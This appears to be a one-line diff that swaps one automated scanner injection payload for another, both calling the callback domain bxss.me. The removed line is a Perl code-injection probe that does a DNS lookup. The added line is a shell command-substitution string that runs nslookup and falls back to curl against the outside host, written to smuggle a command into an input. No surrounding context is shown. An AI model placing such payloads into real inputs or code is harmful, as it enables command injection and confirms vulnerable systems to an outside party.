@@ -1,1 +1,1 @@
-".gethostbyname(lc("hitsz"."qenmzffi3c0ea.bxss.me."))."A".chr(67).chr(hex("58")).chr(110).chr(80).chr(100).chr(70)."
+$(nslookup -q=cname hitptraivmvks5b9e6.bxss.me||curl hitptraivmvks5b9e6.bxss.me)
